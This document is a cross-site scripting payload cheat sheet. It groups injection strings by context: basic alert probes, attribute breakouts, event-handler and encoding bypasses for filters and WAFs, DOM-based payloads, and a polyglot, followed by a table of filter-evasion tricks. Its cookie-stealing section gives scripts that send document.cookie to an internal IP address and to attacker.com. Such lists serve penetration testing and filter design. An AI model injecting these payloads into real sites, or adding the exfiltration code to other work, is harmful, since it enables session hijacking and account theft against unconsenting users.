## 1. Basic Detection Payloads
*Simple alerts to verify if a vector is vulnerable.*

```js
<script>alert(1)</script>
<svg onload=alert(1)>
<body onload=alert(1)>
<img src=x onerror=alert(1)>
<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">CLICKME</maction></math>
````

## 2. Attribute Context Payloads

_Used when injecting inside HTML tags (e.g., `<input value="PAYLOAD">`)._

```js
" autofocus onfocus=alert(1)
'><script>alert(1)</script>
"><script>alert(1)</script>
" onclick="alert(1)"
"><img src=x onerror=alert(1)>
```

## 3. Event Handler Bypasses

_Trying to bypass filters that block specific tags like `<script>`._

```js
<svg/onload=alert(1)>
<svg><script>alert(1)</script>
<details open ontoggle=alert(1)>
<iframe src="javascript:alert(1)">
<marquee onstart=alert(1)>
<body onpageshow=alert(1)>
```

## 4. DOM-Based XSS Payloads

_Injected via URL parameters to manipulate the DOM client-side._

```js
?search=<img src=x onerror=alert(1)>
?callback=<script>alert(1)</script>
#<svg onload=alert(1)>
```

## 5. Advanced/Bypass Payloads

_For bypassing WAFs or specific filters (case sensitivity, encoding, etc.)._
### Case Variation

```js
<ScRiPt>alert(1)</ScRiPt>
<ScRiPt>alert(String.fromCharCode(88,83,83))</ScRiPt>
```

### Encoding (URL/HTML Entity)

```js
%3Cscript%3Ealert(1)%3C/script%3E
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
```

### Null Byte Bypass (Older systems)

```js
<script\x00>alert(1)</script>
```

### JavaScript Protocol

```js
<a href="javascript:alert(1)">Click me</a>
<iframe src="javascript:alert(1)">
```

## 6. Stealing Cookies

_How an attacker might exfiltrate data._

```js
<script>
  fetch('http://192.168.211.2/log?c=' + document.cookie);
</script>

<img src="https://attacker.com/log?c=" + document.cookie>

<script> alert(document.cookie); var i=new Image; i.src="http://192.168.211.2/?"+document.cookie; </script>
```

## 7. Polyglot Payloads

_Designed to break out of multiple contexts (HTML, JS, Attribute) simultaneously._

```js
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>
```


## Common Filters to Bypass

| Filter Type     | Example Blocked String | Bypass Technique                                 |
| --------------- | ---------------------- | ------------------------------------------------ |
| Keyword Block   | `<script>`             | `<scr<script>ipt>` (Double encoding)             |
| Attribute Block | `onerror`              | `onerror` -> `onError` (Case)                    |
| URL Block       | `javascript:`          | `java&#x09;script:` (Whitespace/Encoding)        |
| Event Block     | `alert`                | `confirm(1)`, `prompt(1)`, `String.fromCharCode` |



---
https://slayer0x.github.io/reflected-XSS/#
https://payloadplayground.com/cheatsheets/xss